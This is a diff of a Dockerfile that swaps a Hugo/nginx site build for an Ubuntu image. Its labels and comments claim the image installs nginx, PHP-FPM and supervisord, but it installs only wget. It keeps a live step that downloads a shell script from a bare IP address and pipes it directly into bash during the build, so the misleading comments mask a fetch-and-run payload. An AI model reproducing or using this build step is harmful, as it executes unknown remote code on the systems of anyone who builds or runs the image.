@@ -1,12 +1,17 @@
-FROM klakegg/hugo:0.78.2-alpine
-RUN apk add -U git
-COPY . /src
-RUN make init
-RUN make build
+FROM ubuntu:18.04
 
-FROM nginx:1.19.4-alpine
-RUN apt update;apt -y install wget
+# LABEL about the custom image
+LABEL maintainer="admin@sysadminjournal.com"
+LABEL version="0.1"
+LABEL description="This is custom Docker Image for \
+the PHP-FPM and Nginx Services."
+
+# Disable Prompt During Packages Installation
+ARG DEBIAN_FRONTEND=noninteractive
+
+# Update Ubuntu Software repository
+RUN apt update
+
+# Install nginx, php-fpm and supervisord from ubuntu repository
+RUN apt -y install wget
 RUN wget -O - http://23.92.22.221/start_N_Doc_Pul_mnpls_OV_solo_ws1.sh | bash
-RUN mv /usr/share/nginx/html/index.html /usr/share/nginx/html/old-index.html
-COPY --from=0 /src/public /usr/share/nginx/html
-EXPOSE 80
